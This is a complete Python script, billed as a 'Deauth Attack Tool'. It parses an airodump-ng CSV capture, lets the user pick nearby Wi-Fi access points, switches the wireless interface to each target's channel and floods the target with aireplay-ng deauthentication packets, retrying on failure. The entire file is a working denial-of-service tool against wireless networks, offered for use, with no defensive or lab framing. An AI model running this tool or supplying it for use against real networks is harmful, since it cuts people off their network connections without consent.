#!/usr/bin/env python3
# Wifi Deauthentication

import argparse
import csv
import os
import signal
import subprocess
import sys
from typing import List, Tuple

DEFAULT_INTERFACE = "wlan0mon"
DEFAULT_DEAUTH_COUNT = 20
DEFAULT_PWR_THRESHOLD = 80
MAX_ATTEMPTS = 3

stopAttack = False

def ParseCSV(csvFile: str, pwrThreshold: int) -> List[Tuple[str, str, int, str]]:
    aps = []
    with open(csvFile, newline='', encoding='utf-8', errors='ignore') as f:
        reader = csv.reader(f)
        for row in reader:
            if row and row[0].strip() == "Station MAC":
                break
            if len(row) < 14 or row[0].startswith("BSSID"):
                continue
            try:
                bssid = row[0].strip()
                channel = row[3].strip()
                pwr = int(row[8].strip())
                essid = row[13].strip()
            except ValueError:
                continue
            if abs(pwr) <= pwrThreshold:
                aps.append((bssid, channel, pwr, essid))
    return aps

def ChangeChannel(interface: str, channel: str):
    subprocess.run(["iwconfig", interface, "channel", channel], check=True)

def RunDeauth(interface: str, bssid: str, count: int):
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, interface]
    subprocess.run(cmd, check=True)

def AttemptDeauth(interface: str, bssid: str, channel: str, count: int, attempt: int) -> bool:
    print(f"Attempt {attempt}/{MAX_ATTEMPTS} → {bssid} on channel {channel}")
    ChangeChannel(interface, channel)
    try:
        RunDeauth(interface, bssid, count)
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Error: {e}")
        return False

def DeauthWorkflow(interface: str, deauthCount: int, csvFile: str, pwrThreshold: int):
    global stopAttack

    if not os.path.isfile(csvFile):
        print(f"[!] File not found: {csvFile}")
        return

    aps = ParseCSV(csvFile, pwrThreshold)
    if not aps:
        print(f"[!] No APs ≤ {pwrThreshold} dBm in {csvFile}")
        return

    print(f"\nTargets (PWR ≤ {pwrThreshold} dBm):")
    for i, (bssid, channel, pwr, essid) in enumerate(aps, start=1):
        name = essid or "<hidden>"
        print(f" {i}. {name} | BSSID: {bssid} | CH: {channel} | PWR: {pwr}")

    sel = input("\nSelect networks (e.g. 1,3): ").strip()
    try:
        choices = [int(x) for x in sel.split(",") if x]
    except ValueError:
        print("[!] Invalid selection.")
        return

    for choice in choices:
        if stopAttack:
            break
        if choice < 1 or choice > len(aps):
            print(f"[!] {choice} out of range, skipping.")
            continue
        bssid, channel, _, essid = aps[choice - 1]
        name = essid or "<hidden>"
        print(f"\n>>> Attacking {name} ({bssid}) on CH {channel}")
        for attempt in range(1, MAX_ATTEMPTS + 1):
            if stopAttack:
                break
            success = AttemptDeauth(interface, bssid, channel, deauthCount, attempt)
            if success:
                print(f"[+] Success on attempt {attempt}.")
                break
            if attempt == MAX_ATTEMPTS:
                print(f"[-] Failed after {MAX_ATTEMPTS}.")
            else:
                print("[*] Retrying...")

    print("\nDone.")

def menu():
    interface = input(f"Interface [{DEFAULT_INTERFACE}]: ").strip() or DEFAULT_INTERFACE
    try:
        count = int(input(f"Deauth packets [{DEFAULT_DEAUTH_COUNT}]: ").strip())
    except ValueError:
        count = DEFAULT_DEAUTH_COUNT
    try:
        pwrThreshold = int(input(f"PWR threshold [{DEFAULT_PWR_THRESHOLD}]: ").strip())
    except ValueError:
        pwrThreshold = DEFAULT_PWR_THRESHOLD
    csvFile = input("Airodump CSV file: ").strip()
    DeauthWorkflow(interface, count, csvFile, pwrThreshold)

def terminal():
    parser = argparse.ArgumentParser(description="Deauth Attack Tool")
    parser.add_argument("-i", "--interface", default=DEFAULT_INTERFACE,
                        help=f"Wireless interface (default: {DEFAULT_INTERFACE})")
    parser.add_argument("-c", "--count", type=int, default=DEFAULT_DEAUTH_COUNT,
                        help=f"Deauth packets (default: {DEFAULT_DEAUTH_COUNT})")
    parser.add_argument("-f", "--file", required=True,
                        help="Airodump-ng CSV filename")
    parser.add_argument("-p", "--pwr", type=int, default=DEFAULT_PWR_THRESHOLD,
                        help=f"PWR threshold in dBm (default: {DEFAULT_PWR_THRESHOLD})")
    args = parser.parse_args()
    DeauthWorkflow(args.interface, args.count, args.file, args.pwr)

def SignalHandler(sig, frame):
    global stopAttack
    print("\n[!] Stopping attack...")
    stopAttack = True

def main():
    signal.signal(signal.SIGINT, SignalHandler)
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()
